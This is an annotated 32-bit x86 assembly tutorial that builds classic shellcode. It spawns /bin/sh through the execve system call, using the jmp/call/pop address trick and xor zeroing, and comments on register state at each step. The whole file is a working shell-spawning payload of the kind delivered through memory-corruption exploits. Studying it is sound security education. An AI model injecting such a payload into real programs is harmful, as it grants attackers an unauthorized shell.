				# ASSEMBLY CODE TO SPAWN A SHELL USING THE (11) SYSCALL: sys_execve #
					# (in a 32-bit architecture)

				# In C: // sys_execve("/bin/sh", {"/bin/sh", NULL}, NULL);
				# In assembly: syscall (int $0x80) with:
				# eax =			11 = 0xb
					# ebx =			ADDR = the address of "/bin/sh",
					# ecx =			&ADDR = the address of ADDR, as long as ADDR is followed by NULL = 0x0
												# so that ecx[0] = ADDR
												# so that ecx[1] = NULL
					# edx =			NULL = 0

				# To do that, we will try to put "/bin/shZADDRZZZZ" in memory (where Z stands for 0x00 and ADDR the address of the initial '/'),

				# Thus, we do:
					# (a) eax = 11 # ie			// eax = 11
					# (b) ebx = "/bin/sh" # in C-terms: 	// char ebx[] = "/bin/sh"
					# (c) ecx = {ebx, NULL} # ie 		// *ecx = ebx; *(ecx+4) = 0
					# (d) edx = NULL			// edx = 0

				# And then we call syscall # int $0x80

				# And to finish cleanly, we also call sys_exit(0) i.e. the (eax = 1) syscall with ebx = 0

.text
.globl _start
_start:
	# (a)
	xor %eax, %eax 		# eax is zero-ed because the following instruction only touches al, the last byte of eax
	mov $0xb, %al 		# al = 0xb = 11 # sys_execve

							# Status #
						# eax = 11

	# (b)
	jmp binsh		# Assembly trick (relative address jump) ...
	back: 			# ... the address ADDR of "/bin/sh" (address of first '/') is now at the top of the stack
				# we get it with the 'pop' instruction
				# 	// char* ADDR = "/bin/sh";
	pop %ebx
							# Status #
						# eax = 11
						# ebx = ADDR -> "/bin/sh........."

	# (c)
	movl %ebx, 0x8(%ebx)	# ie:	// *(ebx + 8) = ADDR;

							# Status #
						# eax = 11
						# ebx = ADDR -> "/bin/sh.ADDR...."

	lea 0x8(%ebx), %ecx	# ie:	// ecx = ADDR + 8 = &ADDR

							# Status #
						# eax = 11
						# ebx = ADDR -> "/bin/sh.ADDR...."
						# ecx = ADDR + 8 -----> "ADDR...."

	# (d)
	xor %edx, %edx          # edx = 0
							# Status #
                                                # eax = 11
                                                # ebx = ADDR -> "/bin/sh.ADDR...."
                                                # ecx = ADDR + 8 -----> "ADDR...."
						# edx = 0 = NULL

	# Now some technical details: "/bin/sh" needs to be '\0'- terminated,
	# and ecx[1] must be the NULL address:
	mov %dl, 0x7(%ebx) 	# %dl is the last byte of %edx, also equal to 0
				# ie in C: // ebx[7] = (char) edx = '\0'

                                                	# Status #
                                                # eax = 11
                                                # ebx = ADDR -> "/bin/sh0ADDR...."
                                                # ecx = ADDR + 8 -----> "ADDR...."
                                                # edx = 0 = NULL

	movl %edx, 0xc(%ebx)	# ie in C: // *(ebx + 12) = edx = NULL
                                                       # Status #
                                                # eax = 11
                                                # ebx = ADDR -> "/bin/sh0ADDR0000" ~ "/bin/sh" due to the null-terminating char
                                                # ecx = ADDR + 8 -----> "ADDR0000" ; ecx[] = {ADDR, NULL}
                                                # edx = 0 = NULL
	int $0x80		# syscall
				# Remember, in C: // sys_execve("/bin/sh", {"/bin/sh", NULL}, NULL);

# exit
	xor %eax, %eax		# eax = 0
	mov $1, %al		# eax = 1 # sys_exit
	xor %ebx, %ebx		# ebx = 0
	int $0x80		# syscall

binsh:				# 2 lines here:
	call back			# - the first one jumps back to the main flow,
						# while pushing to the top of the stack
						# the address of the 2nd line (call instead of jmp)
	.asciz "/bin/sh"		# - the second line happens to be just raw data:  "/bin/sh"
#	.ascii "ADDR0000"
